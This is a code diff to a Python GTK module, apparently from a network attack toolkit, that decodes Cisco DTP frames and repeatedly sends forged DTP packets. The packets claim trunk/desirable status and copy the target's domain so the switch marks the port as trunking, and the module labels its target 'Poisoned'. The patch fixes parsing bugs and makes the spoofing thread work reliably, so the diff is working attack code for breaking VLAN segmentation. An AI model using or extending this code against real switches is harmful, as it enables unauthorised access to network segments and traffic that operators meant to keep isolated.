@@ -43,7 +43,7 @@ import gobject
 import gtk
 import gtk.glade
 
-DTP_VERSION = [ 1 ]
+DTP_VERSION = 1 
 DTP_DEST_MAC = "01:00:0c:cc:cc:cc"
 
 class dtp_pdu(object):
@@ -80,7 +80,13 @@ class dtp_tlv(object):
     TYPE_TRUNK =  0x0003
     TYPE_SENDER = 0x0004
     
-    TRUNK_8021Q = 0x05
+    
+    STATUS_ON       = 0x01
+    STATUS_DESIRABLE= 0x03
+    STATUS_AUTO     = 0x04
+    
+    ENCAP_ISL   = 0x02
+    ENCAP_8021Q = 0x05
     
     def __init__(self, t=None, v=None):
         self.t = t
@@ -89,21 +95,27 @@ class dtp_tlv(object):
     def __repr__(self):
         try:
             if self.t == self.TYPE_DOMAIN:
-                return self.v.encode("hex")
+                return self.v #.encode("hex")
             elif self.t == self.TYPE_STATUS:
                 t = "Access"
                 m = "Off"
                 d, = struct.unpack("!B", self.v[0])
                 if d & 0x80 > 0:
                     t = "Trunk"
-                if d & 0x07 > 0:    #todo: get administative states
+                if d & 0x07 == self.STATUS_ON:    #todo: get more administative states ?
                     m = "On"
+                elif d & 0x07 == self.STATUS_DESIRABLE:
+                    m = "Desirable"
+                elif d & 0x07 == self.STATUS_AUTO:
+                    m = "Auto"
                 return "%s/%s" % (t, m)
             elif self.t == self.TYPE_TRUNK:
                 t, = struct.unpack("!B", self.v[0])
-                if (t & 0xe0) > 5 == self.TRUNK_8021Q:
+                if (t & 0xe0) >> 5 == self.ENCAP_8021Q:
                     return "802.1Q"
-                return "Unknown"    #todo: get trunk states
+                elif (t & 0xe0) >> 5 == self.ENCAP_ISL:
+                    return "ISL"
+                return "Unknown"    #todo: get more trunk states ?
             elif self.t == self.TYPE_SENDER:
                 return dnet.eth_ntoa(self.v)
         except:
@@ -111,6 +123,8 @@ class dtp_tlv(object):
         return "%d, %d, %s" % (self.t, self.l, self.v.encode("hex"))
     
     def parse(self, data):
+        if len(data) < 4:
+            return ""
         (self.t, self.l) = struct.unpack("!HH", data[:4])
         self.v = data[4:self.l]
         return data[max(self.l, 4):]
@@ -126,26 +140,30 @@ class dtp_thread(threading.Thread):
 
     def run(self):
         self.parent.log("DTP: Thread started")
+        timer = 30
         while self.running:
-            if not self.parent.target is None:
-                pdu = dtp_pdu(1, [  dtp_tlv(0x1, parent.target["pdu"].get_tlv(0x1).v),
-                                    dtp_tlv(0x2, "\x81"),
-                                    dtp_tlv(0x3, parent.target["pdu"].get_tlv(0x3).v),
-                                    dtp_tlv(0x4, self.parent.mac)
-                                 ] )
-            else:
-                pdu = dtp_pdu(1, [  dtp_tlv(0x1, ""),
-                                    dtp_tlv(0x2, "\x81"),
-                                    dtp_tlv(0x3, "\xa5"),
-                                    dtp_tlv(0x4, self.parent.mac)
-                                 ] )
-            pkg = "\xaa\xaa\x03\x00\x00\x0c\x20\x04" + pdu.render()
-            eth_hdr = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(DTP_DEST_MAC),
-                                                src=self.parent.mac,
-                                                type=len(pkg),
-                                                data=pkg
-                                                )
-            self.parent.dnet.send(str(eth_hdr))
+            if timer == 30:
+                if not self.parent.target is None:
+                    pdu = dtp_pdu(1, [  dtp_tlv(0x1, self.parent.target["pdu"].get_tlv(0x1).v),
+                                        dtp_tlv(0x2, "\x81"),
+                                        dtp_tlv(0x3, "\xa5"),#self.parent.target["pdu"].get_tlv(0x3).v),
+                                        dtp_tlv(0x4, self.parent.mac)
+                                     ] )
+                else:
+                    pdu = dtp_pdu(1, [  dtp_tlv(0x1, ""),
+                                        dtp_tlv(0x2, "\x81"),
+                                        dtp_tlv(0x3, "\xa5"),
+                                        dtp_tlv(0x4, self.parent.mac)
+                                     ] )
+                pkg = "\xaa\xaa\x03\x00\x00\x0c\x20\x04" + pdu.render()
+                eth_hdr = dpkt.ethernet.Ethernet(   dst=dnet.eth_aton(DTP_DEST_MAC),
+                                                    src=self.parent.mac,
+                                                    type=len(pkg),
+                                                    data=pkg
+                                                    )
+                self.parent.dnet.send(str(eth_hdr))
+                timer = 0
+            timer = timer + 1
             time.sleep(1)
         self.parent.log("DTP: Thread terminated")
 
@@ -290,13 +308,17 @@ class mod_class(object):
                 iter = model.get_iter(i)
                 self.target = self.peers[model.get_value(iter, self.STORE_SRC_ROW)]
                 model.set_value(iter, self.STORE_STATE_ROW, "Poisoned")
+            if self.thread is None:
+                self.thread = dtp_thread(self)
             if not self.thread.is_alive():
                 self.thread.start()
         else:
-            self.liststore.set( self.target["row_iter"],
-                                self.STORE_STATE_ROW, "")
+            if not self.target is None:
+                self.liststore.set( self.target["row_iter"],
+                                    self.STORE_STATE_ROW, "")
             self.target = None
             if self.thread:
                 if self.thread.is_alive():
                     self.thread.shutdown()
+                self.thread = None
             
